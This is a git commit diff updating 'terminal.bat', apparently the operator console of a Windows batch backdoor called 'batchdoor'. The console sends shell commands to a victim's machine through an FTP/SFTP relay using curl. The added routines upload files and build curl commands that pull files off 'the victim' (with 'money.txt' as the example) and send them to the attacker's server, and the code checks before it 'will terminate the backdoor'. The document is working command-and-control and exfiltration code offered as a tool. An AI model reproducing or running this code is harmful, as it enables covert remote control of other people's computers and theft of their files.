c5e283956ca0b071e6e6fafe723764e3d85669a7
gato001 <102332233+gato001k1@users.noreply.github.com>
2024-03-12 10:03:51 -0400

    Update terminal.bat

--- terminal.bat
+++ terminal.bat
@@ -1,6 +1,6 @@
 @echo off
 setlocal enablesetdelayedexpansion
-
+title batchdoor terminal v1.2
 if not exist curl.exe (
 
 wget https://github.com/gato001k1/project-batch-message-app/raw/main/curl.exe
@@ -30,6 +30,7 @@ echo the option selected does not exist :(
 :conf
 cls
 Echo Enter the IP address or the Host name of the SFTP or FTP server:
+Echo Do not put the "sftp://"
 set /p ftpServer=#:
 Echo Enter the username to log in to the SFTP or FTP server:
 set /p ftpUsername=#:
@@ -38,12 +39,12 @@ set /p ftpPassword=#:
 rem user creator system   users
     echo creating user
 rem           
-    echo !ftpUsername!>username
-    echo !ftpServer!>server
-    echo !ftpPassword!>password
+    echo %ftpUsername%>username
+    echo %ftpServer%>server
+    echo %ftpPassword%>password
 cls
 :cl
-echo is the server sftp?
+echo is the server Sftp Y, Ftp N,?
 set /p sftpchoose=(Y,N):
 if "%sftpchoose%"=="y" (
     echo o > sftp
@@ -61,14 +62,16 @@ if "%sftpchoose%"=="n" (
     cls
     goto cl
     :confix
-echo > hak
+echo > haks
     set /p username=<username
 set /p password=<password
 set /p server=<server
 echo %username%
 echo %password%
 echo %server%
-"%curlpath%" -u %username%:%password% -T "hak" %sftpmode%://%server% -k
+echo o > t
+echo "%curlpath%" -u %username%:%password% -T "t" %sftpmode%://%server% -k
+"%curlpath%" -u %username%:%password% -T "t" %sftpmode%://%server% -k 2>nul
 echo Checking connection...
 if %ERRORLEVEL% EQU 0 (
    echo  Connection OK!
@@ -92,8 +95,9 @@ if EXIST sftp (
 ) else (
 set "sftpmode=ftp"
 )
-echo !sftpmode!
-"%curlpath%" -u %username%:%password% -T "hak" %sftpmode%://%server% -k
+echo %sftpmode%
+echo o > t
+"%curlpath%" -u %username%:%password% -T "t" %sftpmode%://%server% -k
 echo Checking connection...
 if %ERRORLEVEL% EQU 0 (
    echo  Connection OK!
@@ -111,32 +115,34 @@ goto l
 :l
 cls
 echo use "*" for internal commands
-echo commands: exit, destroy,exitserver
+echo commands: exit, destroy, exitserver, upload, May or not work.
 echo Server credentials: usr: %username% usrn: Terminal pass: %password% serv: %server%
 set /p terminal= Terminal#:
 
-if "%terminal%"=="*,destroy" (
+if "%terminal%"=="*destroy" (
 echo Wip
 goto connect
 )
 
 if "%terminal%"=="*exit" (
-goto stof
+echo Wip    
+    goto stof
 )
 
 if "%terminal%"=="*exitserver" (
 goto exts
 )
 
-echo Terminal:# %terminal% >> hak
-echo %terminal% > com
-"%curlpath%" -u %username%:%password% -T "hak" %sftpmode%://%server% -k 2>nul
-if %ERRORLEVEL% EQU 0 (
-   echo  sended OK!
-) else (
-    echo Error sending hak file
-    pause
+if "%terminal%"=="*upload" (
+goto upload
 )
+
+if "%terminal%"=="*download" (
+goto download
+)
+:SEND
+echo Terminal:# %terminal% >> haks
+echo %terminal% > com
 echo > text.refresh
 "%curlpath%" -u %username%:%password% -T "com" %sftpmode%://%server% -k 2>nul
 if %ERRORLEVEL% EQU 0 (
@@ -151,15 +157,36 @@ goto l
 
 
 :exts
-echo Terminal:# Warning Terminal Terminated! >> hak
-echo exitser > com
-"%curlpath%" -u %username%:%password% -T "hak" %sftpmode%://%server% -k 2>nul
-if %ERRORLEVEL% EQU 0 (
-   echo  sended OK!
+set /p war=Warning this will terminate the backdoor (Y,N)
+if "%war%"=="y" (
+    goto fn
 ) else (
-    echo Error sending hak file
-    pause
+goto l
 )
+
+
+:fn
+set "terminal=exitser"
+goto send
+
+:upload
+set /p ssk=insert the file address where the file is located or the file name if on same directory:#
+set /p ssk1=Enter the name of the file ex: money.txt:#
+echo Sending...
+"%curlpath%" -u %username%:%password% -T "%ssk%" %sftpmode%://%server% -k
+ set "terminal="%curlpath2%" --user %username2%:%password2% -o "%ssk1%" %sftpmode2%://%server2%/%ssk1% -k"
+ pause
+goto send
+
+
+:download
+echo WIP 
+echo Not Working.
+set /p download=Enter the file path or file name if on same directory of the victim:#
+set /p downloadname=Enter the name of the file to download from the victim ex: money.txt:#
+set "terminal="%curlpath2%" -u %username2%:%password2% -T "%download%" %sftpmode2%://%server2% -k"
+echo Terminal:# %terminal% >> haks
+echo %terminal% > com
 echo > text.refresh
 "%curlpath%" -u %username%:%password% -T "com" %sftpmode%://%server% -k 2>nul
 if %ERRORLEVEL% EQU 0 (
@@ -169,5 +196,10 @@ if %ERRORLEVEL% EQU 0 (
     echo Error sending com file
     pause
 )
-
-goto l
+:loopf
+    "%curlpath%" --user %username%:%password% -o %downloadname% %sftpmode%://%server%/%downloadname% -k
+if %ERRORLEVEL% EQU 0 (
+goto loopf
+) else (
+    goto l
+)
